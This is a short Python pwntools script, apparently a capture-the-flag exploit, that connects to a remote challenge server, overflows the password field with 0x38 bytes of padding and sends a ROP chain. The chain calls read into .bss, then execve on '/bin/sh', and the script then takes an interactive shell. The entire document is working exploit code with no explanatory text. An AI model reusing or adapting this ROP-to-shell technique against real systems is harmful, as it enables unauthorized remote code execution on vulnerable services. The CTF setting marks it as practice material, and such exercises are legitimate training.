from pwn import *

#r = process("./reto")

r = remote(b'maradona.ctf.cert.unlp.edu.ar', 15003)

r.recvuntil(b'---Username:')
r.sendline(b"any")
r.recvuntil(b'---Password:')


pop_rdi_ret = 0x0000000000401821
pop_rsi_ret = 0x0000000000407ebe
pop_rdx_ret = 0x000000000040176b
pop_rax_ret = 0x000000000044e283
syscall_ret = 0x41c3fc
padding = b"a"*0x38
bss = 0x004cb000



payload = padding + p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(bss)
payload += p64(pop_rdx_ret) + p64(20)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(pop_rsi_ret) + p64(0)
payload += p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(59)
payload += p64(syscall_ret)
r.sendline(payload)

r.recvuntil(b'Select an option:')
r.sendline(b'3')
r.recvuntil(b'market.')

r.sendline(b"/bin/sh\x00")

r.interactive()